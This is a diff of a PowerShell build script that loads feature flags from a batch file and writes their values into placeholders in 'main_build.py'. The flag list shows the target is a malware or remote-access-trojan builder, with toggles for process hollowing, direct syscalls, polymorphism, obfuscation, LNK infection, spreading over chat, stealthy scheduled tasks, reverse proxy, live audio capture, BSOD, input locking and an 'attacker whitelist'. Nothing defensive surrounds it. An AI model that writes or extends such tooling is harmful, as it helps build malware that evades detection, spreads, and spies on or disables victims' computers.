@@ -19,6 +19,13 @@ elseif ($Mode -eq 'load') {
                 $lines += ('set "' + $parts[0] + '=' + $parts[1] + '"')
             }
         }
+        if (Test-Path '_feat_flags.bat') {
+            Get-Content '_feat_flags.bat' | ForEach-Object {
+                if ($_ -match 'set\s+"([^=]+)=(.*)"$') {
+                    $lines += ('set "' + $Matches[1] + '=' + $Matches[2] + '"')
+                }
+            }
+        }
         $lines | Set-Content -Path _load_config.bat -Encoding ASCII
     }
 }
@@ -52,6 +59,22 @@ elseif ($Mode -eq 'inject') {
         }
         $encVal = 'ENC:' + [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($rawVal))
         $content = $content -replace [regex]::Escape($kv.Key), $encVal
+    }
+    $featFlags = @(
+        'FEAT_POLYMORPHISM', 'FEAT_PROCESS_HOLLOWING', 'FEAT_DIRECT_SYSCALLS',
+        'FEAT_OBFUSCATION', 'FEAT_SELF_SIGN', 'FEAT_PLUGINS', 'FEAT_ASYNC_IO',
+        'FEAT_LNK_INFECTION', 'FEAT_SPREAD_CHAT', 'FEAT_SAFE_MODE',
+        'FEAT_TASK_SCHED_STEALTH', 'FEAT_REVERSE_PROXY', 'FEAT_REMOTE_SOUND',
+        'FEAT_MONITOR_TOGGLE', 'FEAT_BSOD', 'FEAT_INPUT_LOCK',
+        'FEAT_DRAG_DROP', 'FEAT_LIVE_AUDIO', 'FEAT_DARK_LIGHT_MODE',
+        'FEAT_MOBILE_UI', 'FEAT_EXPORT_DATA', 'FEAT_2FA',
+        'FEAT_SOCIAL_ENGINEER', 'FEAT_ATTACKER_WHITELIST'
+    )
+    foreach ($flag in $featFlags) {
+        $placeholder = 'BUILD_' + $flag
+        $val = [System.Environment]::GetEnvironmentVariable($flag)
+        if ($null -eq $val) { $val = '0' }
+        $content = $content -replace [regex]::Escape($placeholder), $val
     }
     $content | Set-Content 'main_build.py' -NoNewline
 }
